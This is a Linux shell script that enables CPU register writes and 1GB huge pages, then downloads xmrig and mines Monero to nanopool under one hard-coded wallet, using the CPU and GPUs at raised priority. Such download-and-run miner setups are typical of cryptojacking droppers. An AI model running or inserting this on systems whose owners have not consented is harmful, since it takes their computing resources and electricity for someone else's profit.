#!/bin/sh -e

MSR_FILE=/sys/module/msr/parameters/allow_writes

if test -e "$MSR_FILE"; then
	echo on > $MSR_FILE
else
	modprobe msr allow_writes=on
fi

if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
	then
	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
		then
			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
				then
					echo "Detected Zen4 CPU"
					wrmsr -a 0xc0011020 0x4400000000000
					wrmsr -a 0xc0011021 0x4000000000040
					wrmsr -a 0xc0011022 0x8680000401570000
					wrmsr -a 0xc001102b 0x2040cc10
					echo "MSR register values for Zen4 applied"
				else
					echo "Detected Zen3 CPU"
					wrmsr -a 0xc0011020 0x4480000000000
					wrmsr -a 0xc0011021 0x1c000200000040
					wrmsr -a 0xc0011022 0xc000000401570000
					wrmsr -a 0xc001102b 0x2000cc10
					echo "MSR register values for Zen3 applied"
				fi
		else
			echo "Detected Zen1/Zen2 CPU"
			wrmsr -a 0xc0011020 0
			wrmsr -a 0xc0011021 0x40
			wrmsr -a 0xc0011022 0x1510000
			wrmsr -a 0xc001102b 0x2000cc16
			echo "MSR register values for Zen1/Zen2 applied"
		fi
elif grep "Intel" /proc/cpuinfo > /dev/null;
	then
		echo "Detected Intel CPU"
		wrmsr -a 0x1a4 0xf
		echo "MSR register values for Intel applied"
else
	echo "No supported CPU detected"
fi

# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

echo "1GB pages successfully enabled"

wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz && tar -xzvf xmrig-6.18.1-linux-static-x64.tar.gz && cd xmrig-6.18.1
./xmrig --opencl --cuda -o xmr-au1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-jp1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-asia1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-us-west1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-us-east1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-eu2.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-eu1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero 	--cpu-priority=5 --asm=auto --randomx-1gb-pages -randomx-cache-qos --cpu-no-yield	

